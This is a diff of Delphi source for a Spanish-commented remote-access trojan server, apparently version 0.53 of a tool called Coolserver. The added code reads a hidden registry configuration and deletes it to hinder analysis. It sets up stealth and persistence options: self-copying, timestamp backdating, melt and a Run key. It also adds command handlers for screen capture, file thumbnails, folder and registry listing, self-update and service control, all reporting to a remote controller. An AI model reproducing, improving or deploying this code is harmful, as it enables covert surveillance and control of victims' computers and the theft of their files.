@@ -87,61 +87,82 @@ const
   var
     ConfigLeida: PSettings;
     i: integer;
+    ConfigRegistro : string;
   begin
     //Aquí va la carga de opciones del editor. Inicializamos las variables configurables del troyano
     //que están todas dentro de un record (Configuracion : TSettings).
-    if ReadSettings(ConfigLeida) = True then
+
+      //0.53 hay que cargar la configuración del registro
+    RegGetString(HKEY_CURRENT_USER, 'Software\C00l', ConfigRegistro); //leemos la config escrita por el conectador
+    RegDelValue(HKEY_CURRENT_USER, 'Software\C00l'); //la borramos para que no sea tan facil de sacarla :p
+    VersionDelServer      := '0.53';
+
+    if(Configregistro <> '') then
     begin
-      //El record Configuracion esta definido en la unidad UnitVariables.
+
+      Configuracion.sHost   := Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1);
+      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
+
+      Configuracion.sPort   := Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1);
+      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
+
+      Configuracion.sID     := Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1);
+      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
+
+      Configuracion.iPort   := strtointdef(Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1),80);
+      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
+
+      if(Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1) = 'false') then
+        Configuracion.bCopiarArchivo := False
+      else
+        Configuracion.bCopiarArchivo := True;
+      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
+
+      Configuracion.sFileNameToCopy := Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1);
+      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
+
+      Configuracion.sCopyTo := Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1); //la carpeta donde debe copiarse
+      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
+
+      if(Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1) = 'false') then
+        Configuracion.bCopiarConFechaAnterior := False
+      else
+        Configuracion.bCopiarConFechaAnterior := True;
+      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
+
+      if(Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1) = 'false') then
+        Configuracion.bMelt   := False
+      else
+        Configuracion.bMelt   := True;
+      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
+
+      if(Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1) = 'false') then
+        Configuracion.bArranqueRun := False
+      else
+        Configuracion.bArranqueRun := True;
+      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
+
+      Configuracion.sRunRegKeyName := Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1);
+      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
+      //Nombre con el que me agrego a policies
+      //MessageBox(0, PChar('Leí la configuración bien. El puerto es: '+Configuracion.sPort), 'Leí', 0); //Para pruebas!!!
 
     end
     else
-    begin
-      //halt;  //Si no pude leer la configuracion...detener la ejecución
-      //Para desarrollo es mejor que cargue una configuración por defecto
+    begin    //Para debug
+      ExitProcess(0);
       Configuracion.sHost   := '127.0.0.1';
       Configuracion.sPort   := '7000';
       Configuracion.sID     := 'Coolserver';
       Configuracion.iPort   := 7000;
-      Configuracion.iTimeToNotify := 1;
-      //En segundos cada cuanto intenta conectarse el server al cliente
       Configuracion.bCopiarArchivo := False; //Me copio o no?
       Configuracion.sFileNameToCopy := 'coolserver.exe';
-      //nombre del nuevo archivo a copiar
-      Configuracion.sCopyTo := 'C:\'; //la carpeta donde debe copiarse
-      Configuracion.bCopiarConFechaAnterior := False; //Modificar la fecha del servidor?
-      Configuracion.bMelt   := False; //Melt?
-      Configuracion.bArranquePolicies := False; //Me agrego a Policies?
-      Configuracion.sPoliciesRegKeyName := 'Coolserver';
-      //Nombre con el que me agrego a policies
-      //MessageBox(0, PChar('Leí la configuración bien. El puerto es: '+Configuracion.sPort), 'Leí', 0); //Para pruebas!!!
-      VersionDelServer      := '0.52';
+      Configuracion.sCopyTo := 'C:\';
+      Configuracion.bCopiarConFechaAnterior := False;
+      Configuracion.bMelt   := False;
+      Configuracion.bArranqueRun := False;
+      Configuracion.sRunRegKeyName := 'Coolserver';
     end;
-    //Fin de carga de configuración
-
-    //Ejecuto los posibles parametros que me puedan pasar
-    if ParamStr(1) = '\melt' then
-    begin
-      //borro el archivo de instalación, reintento 5 veces por si las moscas :)
-      for i := 1 to 5 do
-      begin
-        BorrarArchivo(ParamStr(2));
-        if not FileExists(ParamStr(2)) then
-          break; //si yalo borrò entonces se sale del for
-        Sleep(10);
-      end;
-      //Otra opción: while not BorrarArchivo(ParamStr(2)) do Sleep(10);
-    end; //Termina el Melt
-
-    //Se crean los valores del socket
-  {
-  Cliente := TClassClientSocket.Create;
-  Cliente.ClientSocket := TClientSocket.Create(nil);
-  Cliente.ClientSocket.Host := Configuracion.sHost;
-  Cliente.ClientSocket.Port := Configuracion.iPort;
-  Cliente.ClientSocket.OnRead := Cliente.ClientSocketRead;
-  Cliente.ClientSocket.OnError := Cliente.ClientSocketError;
-  }
   end;
 
   procedure CheckAlive();
@@ -355,21 +376,33 @@ end;
                   sFileNameToCopy + '|' + sCopyTo +
                   '|' + BooleanToStr(bMelt, 'Sí', 'No') + '|' +
                   BooleanToStr(bCopiarConFechaAnterior, 'Sí', 'No') +
-                  '|' + BooleanToStr(bArranquePolicies, 'Sí', 'No') +
-                  '|' + sPoliciesRegKeyName + '|' + ParamStr(0) + '|';
+                  '|' + BooleanToStr(bArranqueRun, 'Sí', 'No') +
+                  '|' + sRunRegKeyName + '|' + ParamStr(0) + '|';
               SendText('SERVIDOR|INFO|' + TempStr + ENTER);
             end;
             //Cerrar server
             if TempStr = 'CERRAR' then
             begin
               //SendText('MSG|Adiós!');
-              Halt;
+              //Halt;
+              ExitProcess(0);
             end;
             //Desinstalar server
             if TempStr = 'DESINSTALAR' then
             begin
               //SendText('MSG|El servidor ha sido desinstalado.');
               Desinstalar();
+            end;
+
+            if TempStr = 'ACTUALIZAR' then
+            begin
+              Borrararchivo(extractfilepath(paramstr(0))+'\'+Configuracion.sPluginName);
+               if ShellExecute(0, 'open', PChar(ParamStr(0)), ''{sin parametros},
+                PChar(ExtractFilePath(paramstr(0))), SW_NORMAL) > 32 then
+                ExitProcess(0)
+              else
+                SendText('MSG|Hubo un problema al intentar auto-ejecutarse, la actualización se completara en el siguiente reinicio' + ENTER);
+
             end;
           end;
 
@@ -393,9 +426,15 @@ end;
           //Fin de comandos relaccionados con los procesos
 
           //Comandos relaccionados con las ventanas
-          if Recibido = 'WIND' then
+          if Copy(Recibido, 1, 4) = 'WIND' then
           begin
-            Respuesta := GetWins();
+            Delete(Recibido, 1, 5);
+            
+            if(Copy(Recibido, 1, 4) = 'true') then
+              Respuesta := GetWins(true)
+            else
+              Respuesta := GetWins(false);
+              
             SendText('WIND|' + Respuesta + ENTER);
           end;
 
@@ -726,14 +765,22 @@ end;
           if Copy(Recibido, 1, 12) = 'LISTARCLAVES' then
           begin
             Delete(Recibido, 1, 13);
+            Tempstr := '';
             TempStr := ListarClaves(Recibido);
-            SendText('LISTARCLAVES|' + IntToStr(length(TempStr)) + '|' + TempStr + ENTER);
+            TempStr := StringReplace(Trim(TempStr),#10, '|salto|', [rfReplaceAll]);
+            TempStr := StringReplace((TempStr),#13, '|salto2|', [rfReplaceAll]);
+            SendText('LISTARCLAVES|' {+ IntToStr(length(TempStr)) + '|'} + TempStr + ENTER);
           end;
 
           if Copy(Recibido, 1, 13) = 'LISTARVALORES' then
           begin
             Delete(Recibido, 1, 14);
-            SendText('LISTARVALORES|' + ListarValores(Recibido) + ENTER);
+            Tempstr := '';
+            Tempstr := ListarValores(Recibido);
+            TempStr := StringReplace(Trim(TempStr),#10, '|salto|', [rfReplaceAll]);
+            TempStr := StringReplace((TempStr),#13, '|salto2|', [rfReplaceAll]);
+
+            SendText('LISTARVALORES|' + TempStr + ENTER);
           end;
 
           if Copy(Recibido, 1, 14) = 'NEWNOMBREVALOR' then
@@ -792,22 +839,7 @@ end;
           if Copy(Recibido, 1, 9) = 'CAPSCREEN' then
           begin
             Delete(Recibido, 1, 9);
-            //    CapturarPantalla(StrToInt(Trim(Recibido))); //Capturamos pantalla con compresion recibida
-            { if saveScreenJpeg(windir + 'jpgcool.dat', StrToInt(Trim(Recibido))) then
-            begin} //Se cambia la forma deg capturar la pantalla (ya no se escribe al disco)
-              //    ThreadInfo := TThreadInfo.Create(Configuracion.sHost, Configuracion.iPort, IntToStr(SH), ExtractFilePath(ParamStr(0)) + 'jpgcool.dat', 'CAPSCREEN', 0);
-              {ThreadInfo := TThreadInfo.Create(Configuracion.sHost, Configuracion.iPort,
-                IntToStr(SH), windir + 'jpgcool.dat', 'CAPSCREEN', 0);
-              BeginThread(nil,
-                0,
-                Addr(ThreadedTransfer),
-                ThreadInfo,
-                0,
-                ThreadInfo.ThreadId);  }
-                {Con el antiguo codigo creaba un nuevo socket cada vez que
-                 queriamos realizar una captura, ahora utiliza siempre el mismo socket}
 
-                
                  if not (CSocket.Connected) then   //si no estamos conectados conectamos...
                  begin
                   CSocket.Connect(Configuracion.sHost, Configuracion.iPort);    //conectamos
@@ -843,12 +875,6 @@ end;
                   CSocket.SendString(Tempstr);    //GOGOGO
 
                  end;
-
-         {   end
-            else
-            begin
-              SendText('MSG|No se pudo capturar la pantalla.' + ENTER);
-            end;  }
           end;
           //Fin del código para capturar pantalla
 
@@ -887,7 +913,7 @@ end;
                   SetLength(TempStr, ms.size);
                   Ms.Read(TempStr[1], ms.size);
                   MS.Free;
-                  MS := nil;     
+                  MS := nil;
                   CSocket.SendString(Tempstr);    //GOGOGO
 
                  end;
@@ -917,31 +943,58 @@ end;
               SetCursorPos(StrToInt(TempStr), StrToInt(TempStr1));
             end;
           end;
+
           if Pos('GETTHUMB|', Recibido) = 1 then
           begin
             Delete(Recibido, 1, 9);
-            Recibido := Trim(Recibido);
-            if generateThumb(Recibido, Replace(Recibido, ExtractFileExt(Recibido), '') + '_th.dat')
-            then //,ExtractFileDir(Recibido)+(ExtractFileName(Recibido)+'_th'+'.obj')) then
-            begin
-              ThreadInfo := TThreadInfo.Create(Configuracion.sHost, Configuracion.iPort,
-                IntToStr(SH), Replace(Recibido, ExtractFileExt(Recibido), '') + '_th.dat', 'GETFILE', 0);
-              ThreadInfo.deleteAfterTransfer := True;
-              //    ThreadInfo.Alias := ExtractFileDir(Recibido)+ExtractFileName(Recibido)+'_th';
-              //    ThreadInfo.Alias := replace(ThreadInfo.Alias, ExtractFileExt(Recibido), '');
-              //    ThreadInfo.Alias := ThreadInfo.Alias + '.jpg';
-              ThreadInfo.Alias := Replace(Recibido, ExtractFileExt(Recibido), '') + '_th.jpg';
+            Recibido := Trim(Recibido); //filename|width|height|calidad|
+            
+            TempStr := copy(recibido, 1, Pos('|', recibido) - 1); //Filename
+            Delete(Recibido, 1, pos('|', Recibido));
+            TempStr1 := Copy(recibido, 1, pos('|', Recibido) - 1); //width
+            Delete(Recibido, 1, pos('|', Recibido));
+            TempStr2 := Copy(recibido, 1, pos('|', Recibido) - 1); //height
+            Delete(Recibido, 1, pos('|', Recibido));
+            TempStr3 := Copy(recibido, 1, pos('|', Recibido) - 1); //calidad
+            Delete(Recibido, 1, pos('|', Recibido));
 
-              //ThreadedTransfer(Pointer(ThreadInfo)); //para debug
-              BeginThread(nil,
-                0,
-                Addr(ThreadedTransfer),
-                ThreadInfo,
-                0,
-                ThreadInfo.ThreadId);
-            end
-            else
-              sock.SendString('MSG|Thumbnail could not be generated' + ENTER);
+                                                           //calidad
+                if not (CSocket.Connected) then   //si no estamos conectados conectamos...
+                 begin
+                  CSocket.Connect(Configuracion.sHost, Configuracion.iPort);    //conectamos
+                 end;
+                  CSocket.SendString('SH|'+inttostr(SH) + ENTER); //nos identificamos
+
+                if CSocket.Connected then
+                 begin
+                  MS := TMemoryStream.create;   //MS de la captura de Pantalla
+                  MS.Position := 0;
+                  if Generatethumb(Tempstr, strtoint(Tempstr1), strtoint(Tempstr2), strtoint(Tempstr3)) then
+                  begin
+                    MS.Position := 0;
+                    Csocket.SendString('THUMBNAIL|'+inttostr(MS.size)+ENTER);  //mandamos el tamaño
+                    TempStr := '';
+                    SetLength(TempStr, ms.size);
+                    Ms.Read(TempStr[1], ms.size);
+                    CSocket.SendString(Tempstr);    //GOGOGO
+                  end
+                  else
+                  begin   //Poco probable...
+
+                  end;
+                  MS.Free;
+                  MS := nil;
+                 end;
+
+          end;
+
+          if Pos('GETFOLDER|', Recibido) = 1 then
+          begin
+            Delete(recibido, 1, 10);
+            Tempstr := '';
+            Tempstr := ArchivosDentroDeDirectorio(Recibido);
+            if (sock.Connected) then //si se le da a un directorio con muchos subdirectorios puede tardar mucho tiempo...
+              sock.SendString('GETFOLDER'+ TempStr + ENTER); //Puede tardar bastante
           end;
 
           if Pos('GETFILE|', Recibido) = 1 then
@@ -1035,18 +1088,21 @@ end;
           begin
             Delete(Recibido, 1, 15);
             ServiceStatus(Recibido, True, True);
+            SendText('MSG|Se ha intentado iniciar el servicio' + ENTER);
           end;
 
           if Pos('DETENERSERVICIO', Recibido) = 1 then
           begin
             Delete(Recibido, 1, 15);
             ServiceStatus(Recibido, True, False);
+            SendText('MSG|Se ha intentado detener el servicio' + ENTER);
           end;
 
           if Pos('BORRARSERVICIO', Recibido) = 1 then
           begin
             Delete(Recibido, 1, 14);
             ServicioBorrar(Recibido);
+            SendText('MSG|Se ha intentado desinstalar el servicio' + ENTER);
           end;
 
           if Pos('INSTALARSERVICIO', Recibido) = 1 then
@@ -1060,6 +1116,7 @@ end;
             TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
             //prueba//messageBox(0,pchar(tempstr+'|'+tempstr1+'|'+tempstr2),0,0);
             ServicioCrear(TempStr, TempStr1, TempStr2);
+            SendText('MSG|Se ha intentado instalar el servicio' + ENTER);
           end;
           lastCommandTime := getTickCount;
           Busy := False;
